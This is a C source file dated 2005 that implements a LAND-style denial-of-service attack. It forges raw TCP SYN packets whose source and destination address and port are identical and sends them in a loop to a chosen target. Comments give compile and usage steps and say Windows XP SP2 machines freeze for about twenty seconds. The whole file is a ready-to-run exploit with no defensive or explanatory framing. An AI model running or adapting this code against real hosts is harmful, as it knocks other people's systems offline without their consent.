/*
 * w32tcpdos.c -- Win32 TCP DoS attack
 *
 * coded from Dejan Levaja (dejan_at_levaja.com) advisory
 * ip/tcp functions ripped from Thamer Al-Herbish.
 *
 * this easy DoS send a tcp packet with ip.src  == ip.dst, 
 *                  tcp.src == tcp.dst and
 *                  SYN flag set.
 *
 * Added: sendind many packet at once..
 *
 * compilation: gcc -Wall -o w32tcpdos2 w32tcpdos2.c
 *
 * usage:   ./w32tcpdos2 10.59.13.6 135
 *      port can be anything you want, but should be
 *      open on target.
 *
 * effect:  box under XP SP2 will freeze about 20sec if
 *      their firewall are disabled (windows firewall)
 *
 * tested against:
 *          - Windows XP SP2 (fw disabled)
 *          - Windows 2k SP4 -> doesn't work.
 *
 * wildcat -- 2005
 * <wildcat@espix.org>
 */

#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>
#include <signal.h>

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <unistd.h>
#include <linux/tcp.h>
#include <netinet/in_systm.h>

// no need to change this :)
#define DEFAULT_TTL 60
#define TCP_WINDOW_SIZE 512
#define TH_OFFSET 5

struct psuedohdr  
{
  struct in_addr source_address;
  struct in_addr dest_address;
  unsigned char place_holder;
  unsigned char protocol;
  unsigned short length;
} psuedohdr;

unsigned int nb;

void ip_gen(char *,unsigned char,struct in_addr , struct in_addr,unsigned short);
void tcp_gen(char *,unsigned short, unsigned short,unsigned long, unsigned long);
unsigned short in_cksum(unsigned short *,int);
unsigned short trans_check(unsigned char, char *,int, struct in_addr, struct in_addr);
void handlerint(int);

int main(int ac, char **av)
{
  unsigned char packet[sizeof(struct iphdr) + sizeof(struct tcphdr)];
  struct sockaddr_in mysocket;
  unsigned short sport, dport;
  struct in_addr saddr, daddr;
  struct tcphdr *tcp;
  unsigned long seq, ack;
  int sockd, on = 1;
  nb=0;
   
  if (ac != 3)
    return (printf("[%s] arguments: <ip> <port>\n", av[0]));
  
  sport = (unsigned short)atoi(av[2]);
  saddr.s_addr = inet_addr(av[1]);

  signal (SIGINT, handlerint);

  dport = sport;
  daddr.s_addr = saddr.s_addr;

  if((sockd = socket(AF_INET,SOCK_RAW,IPPROTO_RAW)) < 0)  
    return (printf("[%s] error while socket()\n", av[0]));
  
  if(setsockopt(sockd,IPPROTO_IP,IP_HDRINCL,(char *)&on,sizeof(on)) < 0)
    return (printf("[%s] error while setsockopt()\n", av[0]));
 
  srand(getpid());

  seq = rand()%time(NULL);
  ack = rand()%time(NULL);

  ip_gen(packet,IPPROTO_TCP,saddr,daddr,sizeof(packet));
  tcp = (struct tcphdr *)(packet + sizeof(struct iphdr));
  tcp_gen((char *)tcp,sport,dport,seq,ack);
  tcp->check = trans_check(IPPROTO_TCP,(char *)tcp, sizeof(struct tcphdr), saddr,  daddr);
  memset(&mysocket,'\0',sizeof(mysocket));

  mysocket.sin_family = AF_INET;
  mysocket.sin_port = htons(dport);
  mysocket.sin_addr = daddr;
  
  printf("[%s] Start sending packet to %s:%s\n", av[0], av[1], av[2]);
  printf("[%s] Hit CTRL+C for stop !\n", av[0]);
  while(42)
  {
    if(sendto(sockd,&packet,sizeof(packet),0x0,(struct sockaddr *)&mysocket,  sizeof(mysocket)) != sizeof(packet))
        return (printf("[%s] error while sendto()\n", av[0]));
    printf("[%s] \tSent on packet... (%d)\n", av[0], nb++);
    sleep(1);
  }

  return 42;  
}

void ip_gen(char *packet,unsigned char protocol,struct in_addr saddr, struct in_addr daddr,unsigned short length)
{ 
  struct iphdr *iphdr;

  iphdr = (struct iphdr *)packet;
  memset((char *)iphdr,'\0',sizeof(struct iphdr));

  iphdr->ihl = 5;
  iphdr->version = IPVERSION;

#ifdef IP_LEN_HORDER
  iphdr->tot_len = length;
#else
  iphdr->tot_len = htons(length);
#endif /* IP_LEN_HORDER */

  iphdr->id = htons(getpid());
  iphdr->ttl = DEFAULT_TTL;
  iphdr->protocol = protocol;

  iphdr->saddr = saddr.s_addr;
  iphdr->daddr = daddr.s_addr;

  iphdr->check = (unsigned short)in_cksum((unsigned short *)iphdr,
                                          sizeof(struct iphdr));
  return;
}

void tcp_gen(char *packet,unsigned short sport, unsigned short dport,unsigned long seq, unsigned long ack)
{
  struct tcphdr *tcp;
  
  tcp = (struct tcphdr *)packet;
  memset((char *)tcp,'\0',sizeof(struct tcphdr));

  tcp->source = htons(sport);
  tcp->dest = htons(dport);
  
  tcp->seq = htonl(seq);
  tcp->ack_seq = htonl(ack);
  
  tcp->res1 = 0;
  tcp->doff = TH_OFFSET;

  tcp->window = htons(TCP_WINDOW_SIZE);
  tcp->syn = 1;

  return;
}


unsigned short in_cksum(unsigned short *addr,int len)
{
        register int sum = 0;
        u_short answer = 0;
        register u_short *w = addr;
        register int nleft = len;

        /*
         * Our algorithm is simple, using a 32 bit accumulator (sum), we add
         * sequential 16 bit words to it, and at the end, fold back all the
         * carry bits from the top 16 bits into the lower 16 bits.
         */
        while (nleft > 1)  {
                sum += *w++;
                nleft -= 2;
        }

        /* mop up an odd byte, if necessary */
        if (nleft == 1) {
                *(u_char *)(&answer) = *(u_char *)w ;
                sum += answer;
        }

        /* add back carry outs from top 16 bits to low 16 bits */
        sum = (sum >> 16) + (sum & 0xffff);     /* add hi 16 to low 16 */
        sum += (sum >> 16);                     /* add carry */
        answer = ~sum;                          /* truncate to 16 bits */
        return(answer);
}

unsigned short trans_check(unsigned char proto, char *packet,int length, struct in_addr source_address, struct in_addr dest_address)
{
  char *psuedo_packet;
  unsigned short answer;
  
  psuedohdr.protocol = proto;
  psuedohdr.length = htons(length);
  psuedohdr.place_holder = 0;

  psuedohdr.source_address = source_address;
  psuedohdr.dest_address = dest_address;
  
  if((psuedo_packet = malloc(sizeof(psuedohdr) + length)) == NULL)  {
    perror("malloc");
    exit(1);
  }
  
  memcpy(psuedo_packet,&psuedohdr,sizeof(psuedohdr));
  memcpy((psuedo_packet + sizeof(psuedohdr)),
     packet,length);
  
  answer = (unsigned short)in_cksum((unsigned short *)psuedo_packet,
                    (length + sizeof(psuedohdr)));
  free(psuedo_packet);
  return answer;
}

void handlerint(int s)
{
    printf("----[%d packet sucessfully sent]----\n", nb);
    exit(0);
}

